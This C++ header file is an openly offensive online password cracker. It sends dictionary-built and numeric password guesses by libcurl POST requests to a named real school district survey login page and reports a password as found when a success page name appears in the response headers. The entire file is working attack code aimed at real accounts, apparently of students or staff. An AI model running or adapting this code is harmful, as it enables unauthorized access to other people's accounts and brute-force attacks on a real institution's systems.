#ifndef CRAKR
#define CRAKR
#include <fstream>
#include <string>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <iostream>
#include <curl/curl.h>
#include <vector>

static size_t write_data(void *ptr, size_t size, size_t nmemb, void *stream)
{
  size_t written = fwrite(ptr, size, nmemb, (FILE *)stream);
  return written;
}


namespace crakr
{
	std::string username;
	int startDaCrack(){
		
		std::string choice;
		std::cout << "Da crakr is opperational, enter username to continue - ";
		std::cin >> username;
		std::cout << "\n(P)assword or (U)ser ID" << std::endl;
		std::cin >> choice;

		if(choice == "P" || choice == "p"){
			std::cout << "Rekting password" << std::endl;
			//START DA PASSWORDDDDD CRAKER
			FILE *headerfile;
			FILE *bodyfile;
			FILE *dicfile;
			CURL *curl_handle;
			curl_global_init(CURL_GLOBAL_ALL);
			//std::ifstream file ("dic/EN4.txt");
			std::string line;
                        std::string dicName;
                        std::cout << "Please enter dictionary file" << std::endl;
                        std::cin >> dicName;

			int l = 0;
			std::ifstream file(dicName);
			while(getline(file,line)){
				l++;
			}
			std::string Arr[l];
			l = 0;
			file.close();
			std::ifstream file2(dicName);
			while(getline(file2,line)){
				Arr[l] = line;
                                std::cout << Arr[l] << std::endl;
				l++;	
			}
			file.close();
			for(int i = 0; i < l; i++){
				for(int i2 = 0; i2 < l; i2++){
					for(int i3 = 0; i3 < 10; i3++){
						std::cout << Arr[i] << Arr[i2] << std::to_string(i3) << std::endl;
						std::string password = Arr[i] + Arr[i2] + std::to_string(i3);
                                                
                                                std::string headerfilename = ("ids/" + password + ".out");

                                                curl_handle = curl_easy_init();

                                                curl_global_init(CURL_GLOBAL_ALL);
                                                curl_handle = curl_easy_init();
                                                curl_easy_setopt(curl_handle, CURLOPT_URL, "https://surveys.canyonsdistrict.org/surveys/login2.cfm");
                                                curl_easy_setopt(curl_handle, CURLOPT_NOPROGRESS, 1L);
                                                curl_easy_setopt(curl_handle, CURLOPT_WRITEFUNCTION, write_data);
                                                headerfile = fopen(headerfilename.c_str(), "wb");
                                                if(!headerfile) {
                                                        curl_easy_cleanup(curl_handle);
                                                        return -1;
                                                }
                                                std::string post = "UserName=" + username + "&Password=" + password;
                                                curl_easy_setopt(curl_handle, CURLOPT_HEADERDATA, headerfile);
                                                curl_easy_setopt(curl_handle, CURLOPT_POSTFIELDS, post.c_str());
                                                curl_easy_perform(curl_handle);
                                                std::cout << "\n" << password << std::endl;
                                                fclose(headerfile);
                                                std::string search;
                                                std::ifstream inFile;
                                                std::string line;

                                                //Open the file
                                                inFile.open(headerfilename.c_str());
                                                //We check to see if the file was opened correctly
                                                if(!inFile){
                                                        std::cout << "Unable to open file" << std::endl;
                                                        //If unable to open it, meaning it has been corrupted or not there, exit the program.
                                                        exit(1);
                                                }
                                                 //This variable is so we can search the file for a string that looks like this, if we find this it means we have successfully found the password and have communicated
                                                //If we are not successful at finding the password, it will show surveys2.cfm or surveys.cfm.
                                                search="mysurveys.cfm";

                                                //We now search the file for the 'mysurveys.cfm'
                                                size_t pos;
                                                while(inFile.good())
                                                {
                                                        //std::cout << "SEARCHING FILE" << std::endl;
                                                        getline(inFile,line); // get line from file
                                                        pos=line.find(search); // search
                                                        if(pos!=std::string::npos) // string::npos is returned if string is not found
                                                        {
                                                                //If we have found the string we find the password.
                                                                std::cout <<"FOUND BY HAVING mysurverys.cfm - " << password;
                                                                int i4;
                                                                std::cin >> i4;
                                                                break;
                                                        }
                                                }
                                                inFile.close();



                                                curl_easy_cleanup(curl_handle);


					}

				}
			}

		}

		if(choice == "U" || choice == "u"){
			FILE *headerfile;
			CURL *curl_handle;
			curl_global_init(CURL_GLOBAL_ALL);

			std::string uname = username;
			std::string number = uname.erase(0,4);
			for(int i = 7; i < 10; i++){
				for(int i2 = 0; i2 < 10; i2++){
					for(int i3 = 0; i3 < 10; i3++){
						std::string password = std::to_string(i) + std::to_string(i2) + std::to_string(i3) + number;
                                                std::string headerfilename = ("ids/" + password + ".out");
                        			
 					        curl_handle = curl_easy_init();

                		        	curl_global_init(CURL_GLOBAL_ALL);
		                	        curl_handle = curl_easy_init();
						curl_easy_setopt(curl_handle, CURLOPT_URL, "https://surveys.canyonsdistrict.org/surveys/login2.cfm");
                        			curl_easy_setopt(curl_handle, CURLOPT_NOPROGRESS, 1L);
			                        curl_easy_setopt(curl_handle, CURLOPT_WRITEFUNCTION, write_data);
						headerfile = fopen(headerfilename.c_str(), "wb");
						if(!headerfile) {
							curl_easy_cleanup(curl_handle);
							return -1;
						}
                                                std::string post = "UserName=" + username + "&Password=" + password;
                                                curl_easy_setopt(curl_handle, CURLOPT_HEADERDATA, headerfile);
                                                curl_easy_setopt(curl_handle, CURLOPT_POSTFIELDS, post.c_str());
						curl_easy_perform(curl_handle);
 						std::cout << "\n" << password << std::endl;
						fclose(headerfile);
						
						std::string search;
						std::ifstream inFile;
						std::string line;
                				
						//Open the file
						inFile.open(headerfilename.c_str());
						//We check to see if the file was opened correctly
						if(!inFile){
							std::cout << "Unable to open file" << std::endl;
                					//If unable to open it, meaning it has been corrupted or not there, exit the program.
							exit(1);
						}
               					 //This variable is so we can search the file for a string that looks like this, if we find this it means we have successfully found the password and have communicated
                				//If we are not successful at finding the password, it will show surveys2.cfm or surveys.cfm.
						search="mysurveys.cfm";

                				//We now search the file for the 'mysurveys.cfm'
						size_t pos;
						while(inFile.good())
				  		{
							//std::cout << "SEARCHING FILE" << std::endl;
					  		getline(inFile,line); // get line from file
					  		pos=line.find(search); // search
					  		if(pos!=std::string::npos) // string::npos is returned if string is not found
							{
                            					//If we have found the string we find the password.
								std::cout <<"FOUND BY HAVING mysurverys.cfm - " << password;
								int i4;
								std::cin >> i4;
								break;
							}
				  		}
				  
				  
				  
				  
				  		inFile.close();



						curl_easy_cleanup(curl_handle);
 						}
					}
				}	

		}
	
	}




};


#endif //CRAKR
